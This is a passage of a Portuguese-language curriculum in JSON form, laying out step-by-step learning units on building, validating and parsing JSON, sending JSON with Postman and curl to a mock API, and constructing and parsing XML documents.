                                  "verification": "O JSON deve ser parseável sem erros em um editor com suporte a JSON.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto com linting JSON (VS Code)",
                                    "Arquivo .json novo"
                                  ],
                                  "tips": "Use indentação (2 ou 4 espaços) para legibilidade, embora não afete validade.",
                                  "learningObjective": "Criar um objeto JSON válido com múltiplos tipos de dados primitivos.",
                                  "commonMistakes": [
                                    "Vírgula extra no final do último item (trailing comma).",
                                    "Chaves ou valores sem aspas onde necessário."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar estruturas aninhadas com arrays e objetos",
                                  "subSteps": [
                                    "Adicione um array dentro de um objeto: \"telefones\": [\"11-9999\", \"11-8888\"].",
                                    "Crie um objeto aninhado: \"endereco\": { \"cidade\": \"SP\", \"cep\": \"01234-567\" }.",
                                    "Combine: array de objetos, ex: \"filhos\": [ { \"nome\": \"Ana\", \"idade\": 5 }, { \"nome\": \"Pedro\", \"idade\": 3 } ].",
                                    "Aumente complexidade com aninhamento de 2 níveis.",
                                    "Verifique balanceamento de colchetes e chaves."
                                  ],
                                  "verification": "Conte os pares de {} e []; devem ser iguais e balanceados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor VS Code com extensão JSON",
                                    "Exemplos de JSON de sites como json.org/examples"
                                  ],
                                  "tips": "Use atalhos de formatação no VS Code (Shift+Alt+F) para auto-indentar.",
                                  "learningObjective": "Construir JSONs hierárquicos com arrays e objetos aninhados sem erros de sintaxe.",
                                  "commonMistakes": [
                                    "Vírgula após último item em array ou objeto.",
                                    "Aspas faltando em chaves de objetos aninhados."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Escapar caracteres especiais em strings",
                                  "subSteps": [
                                    "Identifique caracteres problemáticos: \\, \", \n, \t, unicode.",
                                    "Pratique escaping: \"texto com \\\"aspas\\\" e \\nquebra\".",
                                    "Exemplo: \"mensagem\": \"Olá\\\"mundo\\\"! Preço: R$ 10,99\\nFim.\".",
                                    "Inclua em JSON existente e teste com strings multilinha simuladas.",
                                    "Use sequências unicode para acentos se necessário: \\u00E1 para á."
                                  ],
                                  "verification": "Strings com caracteres especiais devem renderizar corretamente ao parsear.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Lista de escapes JSON no MDN Web Docs",
                                    "Editor com preview JSON"
                                  ],
                                  "tips": "Lembre: \\ para backslash, \\\" para aspas duplas dentro de string.",
                                  "learningObjective": "Aplicar regras de escaping corretamente em strings complexas.",
                                  "commonMistakes": [
                                    "Esquecer de escapar aspas duplas internas.",
                                    "Usar / para quebras de linha em vez de \\n."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar estruturas JSON com ferramentas online",
                                  "subSteps": [
                                    "Cole o JSON criado em jsonlint.com ou jsonformatter.org.",
                                    "Analise erros destacados: linha e coluna do problema.",
                                    "Corrija erros comuns como vírgulas ou aspas e revalide.",
                                    "Use VS Code built-in validator ou extensões para validação local.",
                                    "Teste com JSONs intencionalmente errados para praticar debugging."
                                  ],
                                  "verification": "Ferramenta online retorna 'Valid JSON' sem erros.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "jsonlint.com",
                                    "jsonformatter.curiousconcept.com",
                                    "Extensão JSON VS Code"
                                  ],
                                  "tips": "Sempre valide antes de usar; ferramentas mostram erros exatos.",
                                  "learningObjective": "Diagnosticar e corrigir erros de sintaxe JSON usando validadores.",
                                  "commonMistakes": [
                                    "Ignorar warnings de trailing commas em ferramentas strict.",
                                    "Confundir erros de indentação com sintaxe."
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um JSON para um perfil de usuário: {\n  \"id\": 123,\n  \"nome\": \"João Silva\",\n  \"email\": \"joao\\\"silva\\\"@exemplo.com\",\n  \"ativo\": true,\n  \"scores\": [85, 92, 78],\n  \"endereco\": {\n    \"rua\": \"Av Principal \\n Apto 101\",\n    \"cidade\": \"São Paulo\"\n  },\n  \"hobbies\": null\n}. Valide em jsonlint.com.",
                              "finalVerifications": [
                                "Construa um JSON complexo (aninhado, arrays, escaping) sem erros manuais.",
                                "Valide em pelo menos duas ferramentas online (jsonlint e jsonformatter).",
                                "Parse o JSON em JavaScript console (JSON.parse()) sem exceções.",
                                "Modifique e revalide adicionando/removendo elementos.",
                                "Explique um erro introduzido e como corrigi-lo.",
                                "Crie JSON de 50+ linhas válido."
                              ],
                              "assessmentCriteria": [
                                "Sintaxe 100% válida (sem erros de parsing).",
                                "Uso correto de todos os tipos de dados (string, number, boolean, array, object, null).",
                                "Escaping preciso em strings especiais.",
                                "Aninhamentos balanceados e hierarquia lógica.",
                                "Validação confirmada por ferramentas externas.",
                                "Legibilidade com indentação adequada."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Parsing e stringify em JavaScript/Python.",
                                "Bancos de dados: Armazenamento em MongoDB ou PostgreSQL JSONB.",
                                "Redes: Troca de dados em APIs REST/GraphQL.",
                                "Segurança: Validação contra injeções em web services.",
                                "Matemática: Estruturas de dados hierárquicas como árvores."
                              ],
                              "realWorldApplication": "JSON é o formato padrão para APIs web (ex: RESTful services como Twitter API), configurações de apps (package.json no Node.js), armazenamento em NoSQL e troca de dados entre microserviços, garantindo interoperabilidade entre sistemas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.2.2",
                            "name": "Parsear e manipular JSON em linguagens de programação",
                            "description": "Implementar parsing de JSON para objetos nativos em linguagens como JavaScript (JSON.parse()), Java ou Python (json.loads()), e serialização reversa, lidando com erros de parsing em cenários de serviços web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender fundamentos de JSON, parsing e serialização",
                                  "subSteps": [
                                    "Estude a sintaxe oficial do JSON: chaves duplas, valores suportados (string, number, boolean, array, object, null)",
                                    "Diferencie JSON de objetos nativos das linguagens: JSON é string, objetos são estruturas em memória",
                                    "Aprenda conceitos de parsing (string JSON -> objeto nativo) e serialização (objeto -> string JSON)",
                                    "Revise funções específicas: JS (JSON.parse(), JSON.stringify()), Python (json.loads(), json.dumps()), Java (ObjectMapper ou Gson)",
                                    "Analise exemplos simples de JSON de serviços web, como respostas de APIs REST"
                                  ],
                                  "verification": "Resuma em um documento as diferenças entre parsing e serialização, com exemplos de cada linguagem",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação JSON.org",
                                    "MDN Web Docs para JSON em JS",
                                    "Python json docs",
                                    "Exemplos de JSON de APIs como JSONPlaceholder"
                                  ],
                                  "tips": "Sempre valide JSON online antes de testar (use jsonlint.com)",
                                  "learningObjective": "Identificar corretamente componentes de JSON e mapear funções de parsing/serialização por linguagem",
                                  "commonMistakes": [
                                    "Confundir aspas simples com duplas",
                                    "Ignorar null como valor válido",
                                    "Achar que arrays JS são JSON diretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar parsing e serialização básica em JavaScript e Python",
                                  "subSteps": [
                                    "Em JS: Crie um objeto nativo, serialize com JSON.stringify(), salve em variável string",
                                    "Em JS: Parse a string com JSON.parse(), acesse propriedades do objeto resultante",
                                    "Em Python: Importe json, use json.dumps() para serializar dict/lista, json.loads() para parsear",
                                    "Compare outputs: console.log() em JS, print() em Python para verificar equivalência",
                                    "Teste com JSON de serviço web: cole uma resposta de API em string e parseie"
                                  ],
                                  "verification": "Execute scripts que parseiam e serializam um JSON sample, confirmando que objeto original == parse(serializado)",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Node.js ou browser console",
                                    "Python IDLE ou Jupyter",
                                    "JSON sample: {\"users\":[{\"id\":1,\"name\":\"John\"}]}",
                                    "JSONPlaceholder API docs"
                                  ],
                                  "tips": "Use try-catch em JS para testes iniciais, mesmo sem erros planejados",
                                  "learningObjective": "Executar parsing e serialização bidirecional em JS e Python sem perda de dados",
                                  "commonMistakes": [
                                    "Esquecer import json em Python",
                                    "Passar objeto circular para stringify",
                                    "Não escapar caracteres especiais em strings"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Manipular dados parseados em cenários de serviços web",
                                  "subSteps": [
                                    "Parseie JSON complexo de API (ex: lista de usuários com nested objects)",
                                    "Acesse e modifique propriedades: adicione campo 'active: true', filtre array por condição",
                                    "Combine dados: merge dois objetos parseados de diferentes endpoints",
                                    "Serialze manipulações de volta para novo JSON válido",
                                    "Simule serviço web: use fetch() em JS ou requests em Python para obter JSON real"
                                  ],
                                  "verification": "Mostre before/after: JSON original vs manipulado e serializado, sem erros de sintaxe",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "JSONPlaceholder API (https://jsonplaceholder.typicode.com/users)",
                                    "Postman para inspecionar respostas",
                                    "Editor de código como VS Code"
                                  ],
                                  "tips": "Use console.table() em JS para visualizar arrays de objetos facilmente",
                                  "learningObjective": "Manipular estruturas JSON parseadas como dados mutáveis em aplicações web",
                                  "commonMistakes": [
                                    "Modificar string JSON diretamente (imutável)",
                                    "Perder dados nested ao acessar errado",
                                    "Ignorar tipos (number vs string)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Lidar com erros de parsing e validações em produção",
                                  "subSteps": [
                                    "Teste JSON inválido: aspas simples, chaves sem valor, trailing comma",
                                    "Implemente tratamento: try-catch em JS/Python, valide com JSON.parse() ou loads()",
                                    "Crie funções custom: isValidJSON(string), safeParse() que retorna null em erro",
                                    "Log erros comuns: SyntaxError, TypeError; sugira correções",
                                    "Integre em fluxo web: valide resposta de API antes de usar"
                                  ],
                                  "verification": "Teste 5 JSONs inválidos; função deve falhar graciosamente com mensagem clara",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Lista de JSONs inválidos (gerados manualmente)",
                                    "Documentação de erros JSON por linguagem"
                                  ],
                                  "tips": "Sempre valide JSON no backend antes de enviar ao frontend",
                                  "learningObjective": "Implementar parsing robusto que não quebra app em dados malformados",
                                  "commonMistakes": [
                                    "Não tratar exceções, causando crash",
                                    "Aceitar JSON inválido silenciosamente",
                                    "Confundir erros de rede com parsing"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando JSONPlaceholder API, faça fetch de /users, parseie a resposta, adicione 'role: admin' ao primeiro usuário, filtre usuários com id > 5, e serialize o resultado filtrado para enviar via POST a /users (mesmo endpoint para simulação). Trate erros se resposta não for JSON válido.",
                              "finalVerifications": [
                                "Parsing de JSON válido resulta em objeto acessível sem erros",
                                "Serialização reversa mantém fidelidade aos dados originais",
                                "Manipulação de propriedades nested funciona corretamente",
                                "Erros de parsing são capturados e logados sem crash do programa",
                                "Integração com fetch/requests em cenários web reais",
                                "Validação de JSON antes de processamento"
                              ],
                              "assessmentCriteria": [
                                "Correção: 100% de testes passam sem erros de sintaxe ou runtime",
                                "Robustez: Trata todos erros comuns com mensagens claras (90% cobertura)",
                                "Eficiência: Manipulações em O(n) tempo, sem loops desnecessários",
                                "Clareza: Código comentado, variáveis nomeadas semanticamente",
                                "Abrangência: Demonstra JS e Python, com exemplos equivalentes",
                                "Aplicabilidade: Integra com API real, não só strings hard-coded"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos HTTP e troca de dados em APIs REST",
                                "Banco de Dados: Mapeamento de JSON para esquemas relacionais/NoSQL",
                                "Programação Orientada a Objetos: Tratamento de objetos dinâmicos",
                                "Segurança da Informação: Validação de inputs para prevenir injeções",
                                "Matemática Computacional: Estruturas de dados hierárquicas (árvores/ grafos)"
                              ],
                              "realWorldApplication": "Desenvolvimento de frontends e backends para apps web/mobile, onde JSON é o formato padrão para comunicação cliente-servidor em APIs REST/GraphQL, como em e-commerces (pedidos), redes sociais (posts) ou dashboards (métricas em tempo real)."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.2.3",
                            "name": "Aplicar JSON em requisições de APIs web",
                            "description": "Configurar headers Content-Type: application/json em requisições HTTP POST/PUT para enviar e receber dados JSON em serviços web, simulando chamadas com ferramentas como Postman ou curl.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e dados JSON de teste",
                                  "subSteps": [
                                    "Instale e abra o Postman ou prepare terminal para curl.",
                                    "Selecione uma API de teste pública como JSONPlaceholder (https://jsonplaceholder.typicode.com).",
                                    "Crie um objeto JSON de exemplo válido: {'title': 'Meu Post', 'body': 'Conteúdo detalhado', 'userId': 1}.",
                                    "Valide o JSON usando um validador online como jsonlint.com.",
                                    "Anote endpoints: POST /posts para criar, PUT /posts/{id} para atualizar."
                                  ],
                                  "verification": "Ambiente pronto com Postman aberto e JSON válido salvo em arquivo ou clipboard.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Postman ou curl instalado",
                                    "Navegador para API docs",
                                    "Editor de texto como VS Code"
                                  ],
                                  "tips": "Use JSONPlaceholder para testes sem autenticação; sempre valide JSON antes de enviar.",
                                  "learningObjective": "Configurar ferramentas e preparar payloads JSON corretos para requisições.",
                                  "commonMistakes": [
                                    "JSON malformado (vírgulas extras ou chaves sem aspas)",
                                    "Esquecer de testar API antes",
                                    "Usar APIs reais sem chaves de autenticação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar e enviar requisição POST com JSON no Postman",
                                  "subSteps": [
                                    "Crie nova requisição no Postman: método POST, URL https://jsonplaceholder.typicode.com/posts.",
                                    "Adicione header: Key 'Content-Type', Value 'application/json'.",
                                    "No Body, selecione raw > JSON e cole o objeto JSON preparado.",
                                    "Clique em Send e observe a resposta (esperado: 201 Created com JSON ecoado).",
                                    "Salve a resposta em uma variável ou arquivo para análise."
                                  ],
                                  "verification": "Resposta retorna status 201 e corpo JSON com id gerado.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Postman",
                                    "JSON de exemplo"
                                  ],
                                  "tips": "Verifique o header na aba Headers após envio; use Pre-request Script para automação se avançado.",
                                  "learningObjective": "Dominar configuração de headers e body JSON em POST para envio de dados.",
                                  "commonMistakes": [
                                    "Método errado (GET em vez de POST)",
                                    "Header faltando ou com aspas extras",
                                    "Body não em raw JSON"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar e enviar requisição PUT com JSON no Postman",
                                  "subSteps": [
                                    "Crie nova requisição: método PUT, URL https://jsonplaceholder.typicode.com/posts/1.",
                                    "Adicione header Content-Type: application/json.",
                                    "No Body raw JSON, modifique o JSON: {'id': 1, 'title': 'Atualizado', 'body': 'Novo conteúdo', 'userId': 1}.",
                                    "Envie e verifique resposta (esperado: 200 OK com JSON atualizado).",
                                    "Compare resposta pré e pós-PUT para confirmar mudanças."
                                  ],
                                  "verification": "Status 200 e JSON reflete as atualizações enviadas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Postman",
                                    "JSON modificado"
                                  ],
                                  "tips": "PUT é idempotente; teste múltiplas vezes para ver consistência na API mock.",
                                  "learningObjective": "Aplicar JSON em atualizações via PUT, diferenciando de POST.",
                                  "commonMistakes": [
                                    "URL sem ID específico",
                                    "Esquecer 'id' no body para algumas APIs",
                                    "Confundir PUT com PATCH"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular requisições com curl e validar resultados",
                                  "subSteps": [
                                    "No terminal, teste POST: curl -X POST -H 'Content-Type: application/json' -d '{\"title\":\"foo\",\"body\":\"bar\",\"userId\":1}' https://jsonplaceholder.typicode.com/posts.",
                                    "Teste PUT: curl -X PUT -H 'Content-Type: application/json' -d '{\"id\":1,\"title\":\"updated\",\"body\":\"new\",\"userId\":1}' https://jsonplaceholder.typicode.com/posts/1.",
                                    "Pipe saídas para jq: curl ... | jq para formatar JSON.",
                                    "Verifique status com -w '%{http_code}' e valide parse do JSON.",
                                    "Registre logs de sucesso/erro para portfólio."
                                  ],
                                  "verification": "Comandos curl retornam JSON válido e códigos de status corretos (201/200).",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Terminal com curl",
                                    "jq opcional para parsing"
                                  ],
                                  "tips": "Use -v para verbose e ver headers completos; escape aspas no JSON com \\.",
                                  "learningObjective": "Replicar requisições HTTP JSON via linha de comando para automação e depuração.",
                                  "commonMistakes": [
                                    "Falta de escape em JSON no shell",
                                    "Sem -H para header",
                                    "Ignorar códigos de erro"
                                  ]
                                }
                              ],
                              "practicalExample": "Simule cadastro de usuário em e-commerce: POST /api/users com {'name': 'João', 'email': 'joao@email.com', 'address': {...}} no JSONPlaceholder adaptado, depois PUT /api/users/1 para atualizar endereço.",
                              "finalVerifications": [
                                "Headers incluem Content-Type: application/json em todas requisições.",
                                "Corpos JSON são válidos e parseáveis (sem erros de sintaxe).",
                                "Respostas HTTP têm status 2xx e retornam JSON estruturado.",
                                "Dados enviados são refletidos nas respostas de POST/PUT.",
                                "Requisições funcionam tanto no Postman quanto curl.",
                                "Nenhum erro de CORS ou autenticação em APIs mock."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de headers (Content-Type exato).",
                                "Validade e estrutura do JSON no body (sem erros de parsing).",
                                "Correção de métodos HTTP (POST para create, PUT para update).",
                                "Interpretação correta de respostas (status e payload).",
                                "Reprodutibilidade em ferramentas diferentes (GUI e CLI).",
                                "Documentação de testes com screenshots ou logs."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web: Integração com fetch/axios em JavaScript.",
                                "Banco de Dados: Persistência de dados JSON em NoSQL como MongoDB.",
                                "Segurança da Informação: Headers de autenticação (Authorization) em APIs reais.",
                                "Desenvolvimento Mobile: Chamadas REST em apps React Native/Flutter.",
                                "Análise de Dados: Processamento de respostas JSON em Python pandas."
                              ],
                              "realWorldApplication": "Desenvolver integrações em aplicações full-stack, como apps de delivery enviando pedidos JSON para backends, atualizando estoques via PUT, ou dashboards consumindo APIs de pagamentos com dados estruturados."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.3.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.3.3",
                        "name": "Formato de Dados XML",
                        "description": "XML (eXtensible Markup Language) é um formato estruturado e hierárquico para representação de dados, utilizado em serviços web legados como SOAP, permitindo esquemas definidos por XSD.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.3.3.1",
                            "name": "Construir documentos XML bem-formados",
                            "description": "Criar documentos XML com declaração prologue, elementos raiz, atributos, namespaces e entidades, garantindo formatação válida conforme regras W3C para uso em trocas de dados entre serviços.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Criar a declaração prologue XML",
                                  "subSteps": [
                                    "Abra um editor de texto ou IDE compatível com XML (ex: VS Code).",
                                    "Escreva a declaração inicial: <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>.",
                                    "Explique o propósito: version define a versão XML (geralmente 1.0), encoding especifica o charset (UTF-8 é padrão), standalone indica se o documento é autônomo.",
                                    "Adicione comentários explicativos acima da declaração para documentação.",
                                    "Salve o arquivo com extensão .xml."
                                  ],
                                  "verification": "Verifique se a declaração está na primeira linha, sem espaços antes, e parse o arquivo em um validador XML básico sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Editor de texto (VS Code ou Notepad++)",
                                    "Validador XML online (ex: xmlvalidation.com)"
                                  ],
                                  "tips": "Sempre use aspas duplas para atributos na declaração; evite quebras de linha antes dela.",
                                  "learningObjective": "Dominar a sintaxe obrigatória da prologue para garantir compatibilidade inicial do documento XML.",
                                  "commonMistakes": [
                                    "Esquecer a declaração (obrigatória para documentos standalone)",
                                    "Colocar texto ou espaços antes da <?xml",
                                    "Usar encoding incorreto como ISO-8859-1 sem necessidade"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Construir o elemento raiz e hierarquia de elementos",
                                  "subSteps": [
                                    "Defina o elemento raiz: <root>Conteúdo</root>, garantindo que seja único e envolva todo o conteúdo.",
                                    "Adicione elementos filhos aninhados: <elementoFilho>texto ou sub-elementos</elementoFilho>.",
                                    "Use tags de abertura e fechamento corretas, case-sensitive (XML é sensível a maiúsculas/minúsculas).",
                                    "Inclua texto simples ou CDATA para conteúdo misto se necessário.",
                                    "Formate com indentação para legibilidade (2-4 espaços por nível)."
                                  ],
                                  "verification": "Confirme que há exatamente um elemento raiz, todas tags estão balanceadas e o parser não reporta erros de estrutura.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto com syntax highlighting para XML",
                                    "Ferramenta de formatação XML (ex: XML Formatter online)"
                                  ],
                                  "tips": "Use indentação consistente para visualizar a hierarquia; teste balanceamento com Ctrl+Shift+P no VS Code (XML: Format Document).",
                                  "learningObjective": "Estruturar a árvore XML com elemento raiz único e aninhamento correto para representar dados hierárquicos.",
                                  "commonMistakes": [
                                    "Múltiplos elementos raiz",
                                    "Tags não balanceadas ou mal fechadas",
                                    "Ignorar case-sensitivity (ex: <Root> vs <root>"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Adicionar atributos, namespaces e entidades",
                                  "subSteps": [
                                    "Inclua atributos no elemento de abertura: <elemento atributo1=\"valor\" atributo2=\"valor2\">.",
                                    "Defina namespaces: xmlns=\"http://exemplo.com/ns\" ou xmlns:prefix=\"http://exemplo.com/ns\".",
                                    "Insira entidades pré-definidas: &lt; para <, &amp; para &, ou defina internas como <!ENTITY nome \"valor\">.",
                                    "Use atributos com valores quoted e namespaces em elementos qualificados.",
                                    "Valide que atributos não contenham tags aninhadas."
                                  ],
                                  "verification": "Parse o XML com namespaces ativados; verifique se entidades expandem corretamente e não há conflitos de namespace.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Editor com suporte a XML schemas",
                                    "Validador W3C XML (validator.w3.org)",
                                    "Lista de entidades XML (w3schools.com/xml/xml_entities.asp)"
                                  ],
                                  "tips": "Sempre quote valores de atributos; prefira namespaces default para simplicidade em documentos simples.",
                                  "learningObjective": "Incorporar metadados via atributos e namespaces, e referenciar entidades para reutilização e segurança.",
                                  "commonMistakes": [
                                    "Atributos sem aspas",
                                    "Namespaces mal declarados levando a prefixos indefinidos",
                                    "Entidades não declaradas ou mal escapadas (& em vez de &amp;)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar e formatar o documento XML completo",
                                  "subSteps": [
                                    "Colete o documento inteiro e submeta a um validador W3C oficial.",
                                    "Corrija erros reportados: sintaxe, bem-formação, DTD se aplicável.",
                                    "Aplique formatação pretty-print para legibilidade.",
                                    "Teste em um parser real (ex: JavaScript XMLParser ou Python xml.etree).",
                                    "Adicione DOCTYPE se necessário para validação contra DTD."
                                  ],
                                  "verification": "O validador W3C retorna 'Documento bem-formado' sem erros ou warnings críticos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Validador W3C (https://validator.w3.org/xml/)",
                                    "Parser online (ex: codebeautify.org/xmlvalidator)",
                                    "Ambiente de teste (browser console com new DOMParser())"
                                  ],
                                  "tips": "Salve versões incrementais antes de validar; use ferramentas automatizadas para grandes documentos.",
                                  "learningObjective": "Garantir conformidade total com especificações W3C para interoperabilidade em trocas de dados.",
                                  "commonMistakes": [
                                    "Ignorar warnings de encoding",
                                    "Não testar em múltiplos parsers",
                                    "Esquecer DOCTYPE para entidades externas"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um XML para um pedido de serviço web: <?xml version=\"1.0\" encoding=\"UTF-8\"?><pedido xmlns=\"http://exemplo.com/pedidos\" xmlns:cli=\"http://exemplo.com/clientes\"><cli:cliente id=\"123\" nome=\"João Silva\"><item quantidade=\"2\" >&lt;Produto A&gt;</item></cli:cliente></pedido>. Valide-o contra W3C.",
                              "finalVerifications": [
                                "Declaração prologue presente e correta na linha 1.",
                                "Elemento raiz único com hierarquia balanceada.",
                                "Atributos quoted, namespaces declarados e usados corretamente.",
                                "Entidades resolvidas sem erros.",
                                "Validação W3C confirma 'bem-formado'.",
                                "Formatação indentada e legível."
                              ],
                              "assessmentCriteria": [
                                "Precisão sintática: 100% conformidade com regras XML 1.0 W3C.",
                                "Estrutura lógica: Hierarquia reflete dados de forma semântica.",
                                "Uso avançado: Namespaces e entidades aplicados funcionalmente.",
                                "Validação: Passe em 3 validadores independentes.",
                                "Legibilidade: Indentação e comentários presentes.",
                                "Robustez: Parse sem erros em parser padrão (ex: libxml)."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: Integração com HTML5 e AJAX para trocas XML.",
                                "Programação: Parsing em linguagens como Java (DOM/SAX) ou Python (xml.etree).",
                                "Banco de Dados: Exportação/importação de dados relacionais para XML.",
                                "Segurança da Informação: Entidades e namespaces para evitar injeções XML.",
                                "Gestão de Projetos: Padrões para APIs de serviços web (SOAP/REST)."
                              ],
                              "realWorldApplication": "Em trocas de dados entre serviços web (ex: APIs SOAP em bancos ou e-commerce), onde XML garante estrutura padronizada, validável e interoperável entre sistemas heterogêneos, como integração de ERPs com plataformas de pagamento."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.3.2",
                            "name": "Parsear e processar XML em aplicações",
                            "description": "Utilizar parsers como DOM, SAX ou StAX em linguagens como Java ou .NET para ler, navegar e modificar árvores XML, extraindo dados para integração em serviços web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Fundamentos de XML e Tipos de Parsers",
                                  "subSteps": [
                                    "Estude a estrutura básica de XML: elementos, atributos, namespaces e árvores hierárquicas.",
                                    "Compare parsers DOM (árvore em memória), SAX (event-based streaming) e StAX (pull-based streaming).",
                                    "Identifique cenários de uso: DOM para manipulação completa, SAX/StAX para arquivos grandes.",
                                    "Revise exemplos simples de XML de configuração para serviços web.",
                                    "Pratique validando XML com DTD ou Schema usando ferramentas online."
                                  ],
                                  "verification": "Resuma em um documento as diferenças entre DOM, SAX e StAX, com prós e contras de cada um.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação oficial Java XML (Oracle Docs)",
                                    "Exemplos de XML de sites como W3Schools",
                                    "Editor XML como XMLSpy ou online validators"
                                  ],
                                  "tips": "Comece com DOM para simplicidade, migre para SAX/StAX conforme necessidade de performance.",
                                  "learningObjective": "Compreender as características e usos apropriados de diferentes parsers XML.",
                                  "commonMistakes": [
                                    "Confundir streaming com árvore completa",
                                    "Ignorar namespaces em XMLs complexos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Ambiente e Implementar Parsing DOM em Java",
                                  "subSteps": [
                                    "Instale JDK e IDE (Eclipse/IntelliJ) com suporte a Java XML APIs.",
                                    "Crie um projeto Java e importe javax.xml.parsers.*.",
                                    "Carregue um XML de exemplo usando DocumentBuilderFactory e DocumentBuilder.",
                                    "Navegue pela árvore DOM: getElementsByTagName, getAttribute, getChildNodes.",
                                    "Extraia dados para um objeto Java (ex: Map ou POJO)."
                                  ],
                                  "verification": "Execute código que parseia um XML e imprime todos os elementos e atributos no console sem erros.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "JDK 8+ ou superior",
                                    "XML de exemplo (ex: books.xml com livros e autores)",
                                    "Documentação Java DOM Parser"
                                  ],
                                  "tips": "Use try-catch para XML parsing exceptions e valide o XML antes.",
                                  "learningObjective": "Configurar e usar DOM parser para ler e navegar em documentos XML.",
                                  "commonMistakes": [
                                    "Não tratar MalformedURLException ou ParserConfigurationException",
                                    "Acessar nós sem verificar se existem"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Parsing SAX/StAX e Modificações XML",
                                  "subSteps": [
                                    "Implemente SAX parser com DefaultHandler: startElement, characters, endElement.",
                                    "Para StAX, use XMLInputFactory e XMLStreamReader para pull parsing.",
                                    "Modifique XML com DOM: createElement, setAttribute, appendChild, normalizeDocument.",
                                    "Salve modificações com TransformerFactory e write XML para arquivo.",
                                    "Teste com XML grande (>1MB) para comparar performance DOM vs SAX."
                                  ],
                                  "verification": "Crie e modifique um XML, salve-o e confirme alterações abrindo no editor.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "XML grande de amostra (ex: dataset público)",
                                    "Código fonte de exemplos SAX/StAX da Baeldung ou Oracle"
                                  ],
                                  "tips": "SAX é ideal para one-pass processing; use StAX para controle fino em Java.",
                                  "learningObjective": "Aplicar parsers streaming e realizar modificações seguras em XML.",
                                  "commonMistakes": [
                                    "Perder eventos em SAX sem estado adequado",
                                    "Não fechar streams em StAX"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Parsing XML em Serviços Web",
                                  "subSteps": [
                                    "Crie um servlet ou Spring Boot app que receba XML via POST.",
                                    "Parseie o XML de entrada, extraia dados e processe (ex: valide e armazene em BD).",
                                    "Gere XML de resposta modificado ou convertido.",
                                    "Adicione logging e error handling para cenários reais.",
                                    "Teste com Postman enviando XML requests."
                                  ],
                                  "verification": "Deploye app local e teste endpoint que parseia XML de entrada e retorna JSON/XML processado.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Spring Boot ou Tomcat para web app",
                                    "Postman para testes",
                                    "Exemplo XML de pedido de serviço web"
                                  ],
                                  "tips": "Use JAXB para marshalling/unmarshalling se possível, mas foque em parsers puros.",
                                  "learningObjective": "Integrar XML parsing em aplicações web para troca de dados.",
                                  "commonMistakes": [
                                    "Não sanitizar input XML contra XXE attacks",
                                    "Ignorar encoding UTF-8"
                                  ]
                                }
                              ],
